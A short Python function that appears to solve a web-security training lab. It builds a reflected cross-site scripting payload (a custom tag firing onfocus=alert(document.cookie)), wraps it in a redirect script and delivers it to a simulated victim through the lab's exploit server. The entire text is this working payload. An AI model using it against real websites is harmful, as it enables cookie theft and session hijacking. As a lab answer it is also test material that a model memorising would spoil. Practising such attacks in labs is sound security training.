def solve_lab(session):
    xss = "<xss id=x onfocus=alert(document.cookie) tabindex=1>"
    script = f"""<script>document.location = "{session.url}?search={xss}#x"</script>"""

    server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    server.deliver_exploit_to_victim("/exploit", headers, script)
